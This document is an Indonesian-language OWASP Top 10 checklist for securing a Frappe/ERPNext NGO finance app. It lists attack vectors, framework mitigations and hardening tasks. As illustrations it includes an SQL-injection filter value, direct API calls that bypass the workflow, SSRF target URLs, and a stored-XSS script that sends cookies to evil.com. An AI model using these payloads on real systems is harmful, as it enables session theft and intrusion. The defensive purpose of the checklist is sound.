# Fundara — OWASP Top 10 (2021) Checklist

**Version:** 1.0
**Last Updated:** 2026-06-19
**Audience:** Developer, Tech Lead, security reviewer
**Purpose:** Checklist implementasi OWASP Top 10 yang disesuaikan untuk Frappe/ERPNext custom development Fundara

> **Cara penggunaan:** Tandai setiap item `[ ]` menjadi `[x]` setelah diimplementasikan dan di-review oleh Tech Lead. Update kolom **Status** di Summary Table di bagian akhir dokumen dari `Not Yet` menjadi `Implemented`. Partial = sebagian diimplementasikan, masih ada gap.

---

## A01:2021 — Broken Access Control

**Relevan untuk Fundara:** **YA — Sangat Tinggi**

Fundara memiliki 13 role dengan permission matrix yang kompleks. Setiap DocType memiliki kombinasi permissions berbeda (CRWSAD) per role. Selain itu, ada conditional permissions berbasis ownership (Field Staff hanya melihat record miliknya) dan threshold amount (Finance Officer hanya approve ≤ 50 juta IDR). Ini adalah area risiko tertinggi dalam sistem.

### Attack Vector (Konteks Fundara)

- **Vertical escalation:** Field Staff mengakses endpoint `GET /api/resource/Fund` atau `GET /api/resource/Grant` yang tidak seharusnya dapat diakses.
- **Horizontal escalation (IDOR):** Field Staff A memanggil `GET /api/resource/Cash Advance/CA-0042` yang dimiliki Field Staff B dengan memanipulasi `name` parameter.
- **API bypass:** Memanggil `@frappe.whitelist()` method secara langsung via `POST /api/method/` yang melewati UI permission check.
- **Direct field update:** `PATCH /api/resource/Cash Advance/CA-0042` dengan body `{"workflow_state": "Approved"}` — mencoba mengubah state tanpa melalui workflow engine.
- **Audit role write bypass:** Akun Audit mencoba Write melalui API meskipun role matrix mendefinisikan zero write permissions.

### Frappe/ERPNext Framework Mitigation

- Role Permission Manager mengontrol akses DocType-level per role secara deklaratif.
- `frappe.has_permission(doctype, ptype, doc)` tersedia untuk pengecekan runtime.
- User Permission memungkinkan scope pembatasan record-level berdasarkan link fields.
- `@frappe.whitelist()` decorator memerlukan autentikasi; tanpa decorator method tidak dapat dipanggil.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] Implementasikan `has_permission` hook pada **Cash Advance** controller: Field Staff hanya boleh Read/Write jika `doc.requester == frappe.session.user`.
- [ ] Implementasikan `has_permission` hook pada **Advance Liquidation** controller: Field Staff hanya boleh akses jika liquidation terhubung ke advance miliknya.
- [ ] Implementasikan `has_permission` hook pada **Activity** controller: Field Staff hanya boleh Write jika listed sebagai PIC atau team member.
- [ ] Implementasikan `has_permission` hook pada **Project Manager** scope: Project Manager hanya boleh Write Activity, submit Cash Advance, dan submit Purchase Request untuk project di mana mereka adalah `project_manager`.
- [ ] Implementasikan `has_permission` hook pada **Grant** controller: Donor Relationship Manager hanya boleh Write grant di mana mereka adalah `grant_manager`.
- [ ] **Jangan pernah** menggunakan `frappe.flags.ignore_permissions = True` di code path production. Jika ada kebutuhan legitimasi (background job system), dokumentasikan secara eksplisit dan scope sebit mungkin.
- [ ] Setiap method yang didekorasi `@frappe.whitelist()` harus melakukan permission check eksplisit di baris pertama function body sebelum memproses data apapun.
- [ ] Verifikasi: `GET /api/resource/Cash Advance` dengan akun `pentest-fieldstaff` hanya mengembalikan records milik pengguna tersebut, bukan seluruh records.
- [ ] Verifikasi: `GET /api/resource/Fund` dengan akun `pentest-fieldstaff` mengembalikan 403 atau list kosong dengan error "Not permitted".
- [ ] Verifikasi: Akun Audit (role: Audit / Internal Control) mendapatkan 403 pada semua operasi Write/Create/Delete via API.
- [ ] Verifikasi: Finance Officer tidak dapat melakukan `frappe.call('mark_as_paid')` pada Cash Advance yang `amount > 50,000,000` — harus ditolak server-side.
- [ ] Pastikan tidak ada `get_list` atau `get_all` call dalam custom code yang menggunakan `ignore_permissions=True` tanpa justifikasi eksplisit.

**Status:** Not Yet

---

## A02:2021 — Cryptographic Failures

**Relevan untuk Fundara:** **YA — Tinggi**

Fundara menyimpan data PII donor (nama, kontak, ID dokumen), data keuangan sensitif, dan backup database yang dikirim ke offsite storage. Kegagalan kriptografi dapat mengekspos data ini ke pihak yang tidak berwenang.

### Attack Vector (Konteks Fundara)

- Backup database diupload ke Wasabi/Backblaze B2 tanpa enkripsi — jika bucket di-misconfigure, data terbuka.
- `site_config.json` yang berisi `db_password` memiliki permission file yang terlalu terbuka (world-readable).
- Credentials atau API key ter-commit ke git repository (git history).
- TLS downgrade attack jika TLSv1.0/1.1 masih diizinkan di Nginx.
- Data PII donor dalam log file Frappe atau Nginx access log.

### Frappe/ERPNext Framework Mitigation

- Frappe menggunakan bcrypt untuk hashing password user akun.
- Frappe session token di-generate dengan entropy tinggi.
- Nginx SSL configuration di environment-spec.md sudah menggunakan TLSv1.2 minimum.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] Backup file di-enkripsi dengan GPG (`gpg --symmetric --cipher-algo AES256`) **sebelum** upload ke offsite storage — verifikasi script `backup.sh` mengimplementasikan ini.
- [ ] GPG key untuk backup: gunakan key dengan panjang ≥ 4096-bit (RSA) atau curve25519 (ECC).
- [ ] Verifikasi tidak ada credential sensitif di git history: `git log -S "password" --all` dan `git log -S "secret" --all` harus kosong.
- [ ] `sites/<sitename>/site_config.json` memiliki file permission `640` (owner: `frappe`, group: `frappe`): `stat -c "%a" sites/*/site_config.json` harus menampilkan `640`.
- [ ] TLS 1.2 minimum dikonfigurasi di Nginx: verifikasi dengan `nmap --script ssl-enum-ciphers -p 443 [staging-host]` — tidak boleh ada TLSv1.0 atau TLSv1.1.
- [ ] HSTS header dikonfigurasi di Nginx: `add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;` — verifikasi dengan `curl -I https://[staging-host]`.
- [ ] Pastikan tidak ada data sensitif (PII donor, password, API key) dalam Frappe log (`~/.bench/logs/`) maupun Nginx access log.
- [ ] Field sensitif Beneficiary (nomor ID, data kesehatan) diimplementasikan dengan Frappe field-level permission atau `before_load` hook untuk masking — bukan hanya disembunyikan via UI.
- [ ] Jika ada fitur kirim email laporan: pastikan attachment laporan keuangan tidak dikirim ke alamat yang tidak terotorisasi (validasi recipient).

**Status:** Not Yet

---

## A03:2021 — Injection

**Relevan untuk Fundara:** **YA — Tinggi**

Frappe ORM (frappe.get_doc, frappe.db.get_all, frappe.db.get_list) menggunakan parameterized queries secara default. Namun, custom code yang menggunakan `frappe.db.sql()` secara langsung dengan string concatenation membuka vektor SQL injection. Fundara juga memiliki custom report filters dan API methods yang menerima user input.

### Attack Vector (Konteks Fundara)

- Custom `frappe.db.sql()` call dengan format `f"SELECT * FROM `tabCash Advance` WHERE requester = '{user_input}'"` — SQL injection klasik.
- Filter parameter pada list endpoint: `?filters=[["requester","=","' OR '1'='1"]]`.
- Custom report parameter dikirim langsung ke query tanpa validasi.
- Stored XSS: nama donor `<script>document.location='https://evil.com?c='+document.cookie</script>` disimpan ke database dan di-render ke HTML di halaman lain.
- DOM-based XSS via URL parameter yang di-render langsung ke DOM.

### Frappe/ERPNext Framework Mitigation

- `frappe.db.get_all()`, `frappe.db.get_list()`, `frappe.get_doc()` menggunakan parameterized queries secara internal.
- Frappe Jinja rendering di-escape secara default untuk HTML output.
- Frappe sanitizes filter inputs pada REST API sebelum query.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] Setiap penggunaan `frappe.db.sql()` dalam custom code **wajib** menggunakan parameterized form: `frappe.db.sql("SELECT ... WHERE field = %s", (value,), as_dict=True)` — **tidak boleh** string concatenation atau f-string interpolation.
- [ ] Audit seluruh file Python dalam `fundara/` app dengan: `grep -rn "frappe.db.sql" fundara/` — review setiap hasil untuk memastikan tidak ada string concatenation.
- [ ] User input yang diterima dari API endpoint tidak boleh langsung digunakan sebagai parameter query tanpa validasi type dan length terlebih dahulu.
- [ ] Custom report filters: validasi bahwa nilai filter sesuai tipe data yang diharapkan (angka adalah angka, tanggal adalah tanggal) sebelum diteruskan ke query.
- [ ] API method yang menerima `name` parameter (DocType record name) harus memvalidasi bahwa nilai tersebut adalah string alphanumerik atau sesuai Frappe naming convention — reject jika mengandung SQL metacharacters.
- [ ] File upload: validasi MIME type server-side menggunakan `python-magic` atau `imghdr` — **jangan** hanya mengandalkan ekstensi file atau `Content-Type` header dari client.
- [ ] Pastikan tidak ada `eval()`, `exec()`, atau `subprocess` call yang menerima user input secara langsung.
- [ ] Untuk field yang di-render ke HTML di print format atau dashboard: gunakan Jinja `{{ value | e }}` (auto-escape) — jangan gunakan `{{ value | safe }}` untuk user-supplied data.

**Status:** Not Yet

---

## A04:2021 — Insecure Design

**Relevan untuk Fundara:** **YA — Sangat Tinggi**

Business logic security adalah risiko utama untuk sistem keuangan NGO. Fundara memiliki aturan bisnis kompleks (D-02 budget commitment, approval chain berjenjang, workflow state machine) yang jika di-bypass dapat mengakibatkan fraud keuangan. Frappe workflow engine membantu, tapi implementasi custom tetap harus defensif.

### Attack Vector (Konteks Fundara)

- **D-02 bypass:** Mengirim `PATCH /api/resource/Cash Advance/CA-0042` dengan `{"budget_available": 1}` untuk memaksa approval meskipun budget tidak tersedia.
- **Workflow skip:** Langsung set `workflow_state = "Approved"` via REST API tanpa melalui Frappe Workflow transitions.
- **Amount manipulation:** Mengubah `amount_requested` setelah submit melalui direct API call, menghindari approval threshold.
- **Self-approval:** Field Staff yang juga memiliki peran lain (jika ada), atau menemukan loophole di mana Field Staff dapat mentrigger transition "Approve".
- **Race condition duplicate:** Double-submit Cash Advance dalam waktu yang sangat cepat untuk mendapat dua disbursement dari satu request.
- **Fund restriction bypass:** Posting transaksi ke Fund yang memiliki `restriction_purpose` melalui API dengan mengabaikan validasi restriction.

### Frappe/ERPNext Framework Mitigation

- Frappe Workflow engine mengontrol state transitions — hanya role yang terdaftar yang bisa mentrigger action.
- Frappe `docstatus` field mencegah edit setelah submit (docstatus = 1).
- Frappe `validate` dan `before_submit` hooks tersedia untuk validasi server-side.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] **D-02 budget check wajib diimplementasikan server-side** di `validate` atau `before_submit` hook Cash Advance dan Purchase Request — client tidak boleh dipercaya untuk nilai `budget_available`.
- [ ] Field `budget_available` pada Cash Advance dan Purchase Request harus dihitung server-side saat `validate()` dipanggil — jangan izinkan client men-set nilai ini.
- [ ] Workflow state transition hanya boleh dilakukan melalui Frappe Workflow engine: implementasikan `validate` hook yang menolak perubahan `workflow_state` secara langsung jika tidak melalui workflow action yang sah.
- [ ] Approval threshold check harus dilakukan server-side di transition condition atau di controller `has_permission` — bukan hanya di UI button visibility.
- [ ] Amount fields (`amount_requested`, `amount_approved`) harus `read_only: 1` setelah submit pada level DocType definition — dan diperkuat dengan `before_save` hook yang menolak perubahan jika `docstatus == 1`.
- [ ] Fund balance harus dihitung server-side sebagai computed field — jangan simpan sebagai user-editable field yang bisa di-PATCH via API.
- [ ] Implement idempotency check untuk Cash Advance submission: cek apakah ada advance aktif (status bukan Closed/Cancelled/Rejected) dengan requester yang sama dan amount yang identik dalam window 1 menit — tolak sebagai duplicate.
- [ ] `mark_as_paid` custom method harus memverifikasi bahwa dokumen dalam state "Approved" sebelum memproses pembayaran — jangan asumsikan state berdasarkan parameter yang dikirim client.
- [ ] Fund restriction check: implementasikan validasi server-side bahwa `fund.restriction_purpose` kompatibel dengan `activity.category` sebelum memproses transaksi.

**Status:** Not Yet

---

## A05:2021 — Security Misconfiguration

**Relevan untuk Fundara:** **YA — Sangat Tinggi**

Frappe/ERPNext memiliki banyak konfigurasi yang harus diubah dari default development ke production. Misconfiguration adalah vektor umum untuk aplikasi berbasis framework open-source.

### Attack Vector (Konteks Fundara)

- `developer_mode = 1` di production mengekspos debug interface, stacktrace detail, dan memungkinkan arbitrary server script execution melalui Frappe Console.
- Default admin password yang tidak diubah.
- System Manager role diberikan ke terlalu banyak akun developer.
- Nginx port 8000 (Frappe direct) atau port 9000 (Socket.IO) accessible dari publik — bypass Nginx.
- Redis tanpa password — accessible dari localhost tapi dapat di-eksploitasi jika ada SSRF.
- MariaDB dengan anonymous user atau root tanpa password.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] Developer mode **DISABLED** di production dan staging: `bench --site [site] set-config developer_mode 0` — verifikasi dengan `bench --site [site] get-config developer_mode`.
- [ ] Debug mode **DISABLED**: pastikan tidak ada `frappe.conf.debug = 1` atau `DEBUG = True` di production config.
- [ ] Default admin password **WAJIB** diubah saat provisioning — verifikasi dengan mencoba login ke `/login` dengan password `admin`.
- [ ] System Manager role: hanya 1–2 akun (Tech Lead dan satu backup) — audit dengan query: `SELECT parent FROM `tabHas Role` WHERE role = 'System Manager'`.
- [ ] Frappe demo data **TIDAK** di-load di production: verifikasi tidak ada dokumen dummy seperti "Agrico" atau "Wind Power LLC" di Supplier/Customer list.
- [ ] Nginx: `server_tokens off;` dikonfigurasi di `http` block — verifikasi dengan `curl -I [staging-url]` dan pastikan header `Server` tidak menampilkan versi Nginx.
- [ ] Nginx: default server block menggunakan `return 444;` untuk reject request dengan unknown/missing Host header.
- [ ] MariaDB: `mysql_secure_installation` sudah dijalankan — root account password set, anonymous users removed, test database removed.
- [ ] Redis: `bind 127.0.0.1` dan `requirepass [password]` dikonfigurasi di `redis.conf` untuk semua 3 instance Redis (cache, queue, socketio).
- [ ] UFW: hanya port 22, 80, 443 yang open ke publik. Port 8000, 9000, 3306, 6379, 11000, 12000, 13000 **tidak boleh** open ke publik.
- [ ] SSH: `PasswordAuthentication no` dan `PermitRootLogin no` di `/etc/ssh/sshd_config`.
- [ ] `unattended-upgrades` diaktifkan untuk security patches: `systemctl status unattended-upgrades`.
- [ ] `robots.txt` staging mengandung `Disallow: /` untuk mencegah indexing.

**Status:** Not Yet

---

## A06:2021 — Vulnerable and Outdated Components

**Relevan untuk Fundara:** **YA — Menengah**

ERPNext/Frappe adalah dependency utama yang aktif di-maintain. Namun, custom Fundara app juga memiliki Python dependencies sendiri. Update yang tidak terkontrol dapat merusak fungsi; tidak update dapat membuka CVE.

### Attack Vector (Konteks Fundara)

- CVE pada versi Python library yang digunakan (`requests`, `cryptography`, `Pillow`, dll.) yang belum di-patch.
- ERPNext versi lama yang memiliki known vulnerability yang belum di-upgrade.
- wkhtmltopdf versi bermasalah — SSRF via HTML injection dalam PDF generation jika user dapat mengontrol konten dokumen.

### Frappe/ERPNext Framework Mitigation

- ERPNext adalah proyek aktif dengan release notes yang mendokumentasikan security fixes.
- Bench dapat melakukan `bench update` untuk menarik versi terbaru dari pinned branch.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] ERPNext dan Frappe di-pin ke versi yang sudah ditest di `requirements.txt` atau `apps.txt` — verifikasi tidak menggunakan `version-16` branch floating tanpa version lock.
- [ ] `pip audit` di environment staging mengembalikan zero HIGH atau CRITICAL CVEs: `cd frappe-bench && env/bin/pip-audit`.
- [ ] `npm audit` di Fundara app mengembalikan zero HIGH atau CRITICAL CVEs: `cd apps/fundara && npm audit --audit-level=high`.
- [ ] Ubuntu package list dicek setiap bulan: `apt list --upgradable 2>/dev/null | grep -E "(security)"` — prioritaskan security updates.
- [ ] wkhtmltopdf: gunakan versi `0.12.6` dengan patched Qt — jangan upgrade ke versi lebih baru yang memiliki regresi compatibility dengan ERPNext.
- [ ] Python version: 3.12.x (sesuai environment-spec.md) — Python 3.10 sudah EOL.
- [ ] Buat proses review dependency update: sebelum `bench update`, review changelog ERPNext untuk security notes.

**Status:** Not Yet

---

## A07:2021 — Identification and Authentication Failures

**Relevan untuk Fundara:** **YA — Sangat Tinggi**

Fundara menyimpan data keuangan sensitif NGO. Kegagalan autentikasi — seperti brute force yang tidak dibatasi, session yang tidak expired, atau 2FA yang mudah di-bypass — langsung memberikan akses ke data ini.

### Attack Vector (Konteks Fundara)

- Brute force password akun Finance Manager atau Executive Director tanpa rate limiting — akses ke seluruh data keuangan.
- Session token yang tidak di-invalidate setelah logout — session hijacking via stolen token.
- TOTP code pada 2FA yang dapat di-replay dalam window yang terlalu lebar.
- Akun mantan karyawan yang tidak di-disable — akses tetap aktif setelah offboarding.

### Frappe/ERPNext Framework Mitigation

- Frappe memiliki built-in login attempt throttling yang dapat dikonfigurasi.
- Frappe mendukung TOTP-based 2FA secara native.
- Session management dihandle oleh Frappe dengan secure defaults (HTTP-only cookies).

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] Login attempt limit dikonfigurasi: maksimum **5 gagal login**, lockout **30 menit** — cek di System Settings > Security: `frappe.db.get_value("System Settings", None, "allow_login_using_mobile_number")` dan `max_login_attempts`.
- [ ] 2FA **wajib diaktifkan** untuk role Finance Manager, Executive Director, dan System Manager — enforce via Frappe Role-based 2FA requirement.
- [ ] Session expiry dikonfigurasi **8 jam** — cek System Settings > Session Expiry.
- [ ] Concurrent session limit dikonfigurasi di System Settings — satu pengguna tidak boleh memiliki lebih dari N session aktif secara bersamaan.
- [ ] Password policy minimum: **12 karakter**, wajib mengandung huruf besar, huruf kecil, angka, dan karakter khusus — konfigurasi di System Settings > Password.
- [ ] Password reset: gunakan time-limited token (ekspiry 1 jam) via email — verifikasi tidak menggunakan security questions.
- [ ] Offboarding checklist: ada proses tertulis untuk **mendisable akun Frappe** pada hari yang sama ketika karyawan keluar — bukan menunggu IT cycle berikutnya.
- [ ] Verifikasi bahwa setelah logout, session token di-blacklist di server side — request ulang dengan token lama harus return 403.
- [ ] Verifikasi bahwa TOTP code tidak dapat di-replay dalam window > 30 detik.

**Status:** Not Yet

---

## A08:2021 — Software and Data Integrity Failures

**Relevan untuk Fundara:** **Menengah**

Fundara di-install dari GitHub. Jika deployment process tidak memverifikasi integritas source, supply chain attack dapat menginjeksi malicious code. Auto-update tanpa testing dapat memperkenalkan breaking changes atau vulnerability baru.

### Attack Vector (Konteks Fundara)

- Dependency substitution: package Python atau npm dengan nama mirip yang mengandung malicious code.
- Deploy dari branch `main` yang belum di-tag release — kode yang belum ditest masuk ke production.
- Frappe fixture (Role, Workflow, Permission) yang di-import dari sumber tidak terpercaya mengubah access control.
- Background scheduled job di `hooks.py` yang memanggl method tidak terotorisasi.

### Frappe/ERPNext Framework Mitigation

- Frappe Scheduler Jobs dibatasi pada method yang terdaftar di `hooks.py` dalam app code.
- Git history memberikan audit trail perubahan code.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] Fundara app di-install **hanya** dari repository resmi `masmaksum/Fundara` di GitHub — jangan install dari fork atau sumber tidak dikenal.
- [ ] Deploy ke production **hanya dari tagged release** (mis. `v1.0.0`) — bukan dari `HEAD` branch `main` secara langsung. Proses: tag → test di staging → deploy tag tersebut ke production.
- [ ] Verifikasi commit signature sebelum deployment (opsional tapi direkomendasikan): `git log --show-signature -1`.
- [ ] Auto-update Fundara custom app: **DINONAKTIFKAN** — update dilakukan manual setelah testing di staging.
- [ ] Frappe fixtures (Roles, Workflows, DocType permissions): simpan di `fundara/fixtures/` dan verifikasi isinya setelah deploy dengan membandingkan terhadap source of truth di repository.
- [ ] Scheduled jobs di `hooks.py`: audit bahwa setiap method yang terdaftar di `scheduler_events` adalah method legitimate Fundara — bukan method yang bisa diinjeksi.
- [ ] Sebelum menjalankan `bench update`, baca changelog ERPNext untuk breaking changes dan security notes.

**Status:** Not Yet

---

## A09:2021 — Security Logging and Monitoring Failures

**Relevan untuk Fundara:** **YA — Tinggi**

Tanpa logging yang memadai, insiden keamanan (unauthorized access, data exfiltration, brute force) tidak akan terdeteksi atau terdeteksi terlambat. Untuk sistem keuangan NGO, audit trail juga merupakan kebutuhan compliance.

### Attack Vector (Konteks Fundara)

- Akses tidak terotorisasi ke data keuangan tanpa alert — attacker dapat mengekstrak data selama berhari-hari tanpa diketahui.
- Penghapusan GL Entry tanpa dicatat — manipulasi data finansial historis.
- Brute force login spike yang tidak dimonitoring.

### Frappe/ERPNext Framework Mitigation

- Frappe Activity Log mencatat login, logout, dan akses dokumen secara default.
- ERPNext Document Version history tersedia untuk DocType yang dikonfigurasi.
- GL Entry secara default tidak dapat dihapus setelah submit di ERPNext.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] Frappe Activity Log **DIAKTIFKAN** dan tidak pernah dimatikan di production — verifikasi: System Settings > Activity Log > Enable Activity Log = 1.
- [ ] Document Version history **DIAKTIFKAN** untuk semua submittable DocTypes: Cash Advance, Advance Liquidation, Transaction, Fund, Grant, Purchase Order — konfigurasi di DocType definition (Track Changes = Yes).
- [ ] GL Entry **immutable**: verifikasi bahwa tidak ada custom code yang melakukan `frappe.delete_doc("GL Entry", ...)` — audit dengan `grep -rn "delete_doc.*GL Entry" apps/fundara/`.
- [ ] Server logs **diretain minimum 1 tahun**: konfigurasi logrotate untuk Nginx access log dan error log dengan retention 365 hari.
- [ ] Monitoring alert: Uptime Kuma (atau monitoring tool yang dikonfigurasi) mengirim notifikasi ke channel yang ditetapkan jika staging/production down lebih dari 2 menit.
- [ ] Alert untuk failed login spike: konfigurasi alert jika ada > 10 failed login dalam 5 menit dari satu IP (via fail2ban log parsing atau Frappe notification).
- [ ] Log files tidak world-readable: `ls -la /var/log/nginx/` harus menampilkan permission `640` atau `600` — bukan `644`.
- [ ] Cash Advance state transitions dicatat: pastikan Frappe Workflow log tersimpan dan dapat diaudit per document.
- [ ] Custom API calls ke `@frappe.whitelist()` methods dicatat dalam Frappe log dengan user identity dan parameters (tanpa sensitive values).

**Status:** Not Yet

---

## A10:2021 — Server-Side Request Forgery (SSRF)

**Relevan untuk Fundara:** **RENDAH — untuk MVP**

Fundara MVP tidak memiliki fitur yang melakukan HTTP request ke URL yang disuplai user (tidak ada webhook configuration oleh user, tidak ada URL-based data import, tidak ada external API call berbasis user input). Risiko meningkat jika fitur-fitur ini ditambahkan di versi berikutnya.

### Attack Vector (Konteks Fundara)

- Jika ditambahkan fitur webhook: user menyuplai URL `http://169.254.169.254/latest/meta-data/` (AWS metadata endpoint) atau `http://localhost:3306` — attacker dapat menggunakan server sebagai proxy untuk scan internal network.
- Jika ditambahkan fitur import data dari URL: user menyuplai file:// URL atau internal URL.
- Jika ditambahkan integrasi exchange rate API: URL dikonfigurasi oleh user per-tenant.

### Frappe/ERPNext Framework Mitigation

- Frappe tidak secara default membuat outbound HTTP requests berdasarkan user input.
- Email SMTP dikonfigurasi di System Settings secara statis — bukan per-request.

### Yang Wajib Dilakukan Custom Code Fundara

- [ ] **MVP:** Verifikasi tidak ada fitur aktif yang menerima URL dari user input dan melakukan HTTP request server-side.
- [ ] Jika fitur webhook ditambahkan di masa depan: implementasikan URL allowlist yang membatasi destination URL ke domain yang disetujui saja — tolak private IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x, 127.x.x.x, 169.254.x.x).
- [ ] Jika fitur exchange rate / external API integration ditambahkan: URL dikonfigurasi oleh System Admin secara statis di System Settings — **bukan** diisi oleh user biasa per-transaksi.
- [ ] Jika fitur import data dari URL ditambahkan: validasi URL scheme (hanya `https://`), blokir IP private, implementasikan timeout maksimum 5 detik.
- [ ] Email integration (SMTP): server address dikonfigurasi statis di Frappe System Settings — bukan user-supplied per email yang dikirim.

**Status:** N/A (MVP — monitor jika fitur baru ditambahkan)

---

## Summary Table

Update kolom **Status** dari `Not Yet` menjadi `Implemented` setelah setiap item diimplementasikan dan di-review oleh Tech Lead.

| # | OWASP Item | Relevansi | Framework Coverage | Custom Code Required | Status |
|---|---|---|---|---|---|
| A01 | Broken Access Control | Sangat Tinggi | Partial (Role Permission Manager, has_permission hook tersedia) | Tinggi — has_permission hooks, owner-level restrictions, whitelist method checks | Not Yet |
| A02 | Cryptographic Failures | Tinggi | Partial (bcrypt passwords, HTTPS via Nginx) | Menengah — GPG backup encryption, file permissions, no secrets in git | Not Yet |
| A03 | Injection | Tinggi | Partial (ORM parameterized queries untuk frappe.db.get_all) | Tinggi — audit frappe.db.sql calls, custom report filter validation, MIME type validation | Not Yet |
| A04 | Insecure Design | Sangat Tinggi | Partial (Workflow engine, docstatus protection) | Tinggi — server-side budget check, amount immutability after submit, idempotency | Not Yet |
| A05 | Security Misconfiguration | Sangat Tinggi | Partial (developer_mode config option tersedia) | Tinggi — deployment checklist: developer_mode off, Redis password, UFW, SSH hardening | Not Yet |
| A06 | Vulnerable and Outdated Components | Menengah | Minimal (framework updates tersedia tapi manual) | Menengah — pip audit, npm audit, pinned versions, update process | Not Yet |
| A07 | Identification and Authentication Failures | Sangat Tinggi | Tinggi (Frappe login throttling, 2FA support, session management) | Menengah — enforce 2FA untuk privileged roles, password policy, offboarding checklist | Not Yet |
| A08 | Software and Data Integrity Failures | Menengah | Minimal (git history tersedia) | Menengah — deploy dari tagged release, fixture verification, scheduler audit | Not Yet |
| A09 | Security Logging and Monitoring Failures | Tinggi | Tinggi (Activity Log, GL Entry immutability, Document Version) | Menengah — log retention, monitoring alerts, failed login alerting | Not Yet |
| A10 | Server-Side Request Forgery | Rendah (MVP) | Tinggi (tidak ada user-supplied URL fetch di MVP) | Rendah — monitor saat fitur baru ditambahkan; URL allowlist jika webhook/import ditambahkan | N/A |

> **Instruksi:** Update kolom Status dari `Not Yet` ke `Implemented` setelah setiap item diimplementasikan dan di-review oleh Tech Lead. Gunakan `Partial` jika sebagian checklist sudah selesai tapi ada item yang masih open.

---

## Referensi

| Dokumen | Path |
|---|---|
| Permission Matrix | `docs/spec/permissions.md` |
| Environment Specification | `docs/infra/environment-spec.md` |
| Workflow Configurations | `docs/spec/workflows.md` |
| Security Requirements | `docs/security/security-requirements.md` |
| Penetration Testing Scope | `docs/security/pentest-scope.md` |
| OWASP Top 10 (2021) | https://owasp.org/Top10/ |
